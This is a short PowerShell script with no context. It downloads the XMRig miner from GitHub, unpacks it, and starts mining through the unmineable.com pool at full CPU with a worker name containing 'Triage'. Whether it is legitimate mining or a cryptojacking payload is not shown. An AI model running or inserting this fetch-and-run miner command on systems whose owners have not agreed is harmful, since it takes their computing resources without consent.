Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip
.\xmrig\xmrig-6.22.2\xmrig.exe -o stratum+ssl://rx.unmineable.com:443 -u "1520604138.Triage#58l1-gn9b+5500" --cpu-priority 4 --cpu-max-threads-hint=100 --algo=rx/0
